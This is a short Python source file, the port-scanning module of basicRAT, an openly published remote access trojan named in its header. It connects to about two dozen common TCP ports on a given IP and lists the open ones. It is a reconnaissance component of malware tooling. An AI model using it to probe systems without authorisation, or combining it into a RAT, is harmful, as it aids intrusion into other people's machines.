#
# basicRAT scan module
# https://github.com/vesche/basicRAT
#

import socket


PORTS = [ 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 179, 443, 445,
514, 993, 995, 1723, 3306, 3389, 5900, 8000, 8080, 8443, 8888 ]

def scan(ip):
    if ip == '': ip = '127.0.0.1'
    try:
        socket.inet_aton(ip)
    except socket.error:
        return 'Error: Invalid IP address.'

    results = '----------\n'
    total = 0

    for p in PORTS:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c = s.connect_ex((ip, p))
        socket.setdefaulttimeout(0.5)

        #state = 'open' if not c else 'closed'
        #results += '{:>5}/tcp {:>7}\n'.format(p, state)

        if not c:
            results += '{:>5}/tcp open\n'.format(p)
            total += 1

    results += "{} ports open\n".format(total)
    return results.rstrip()

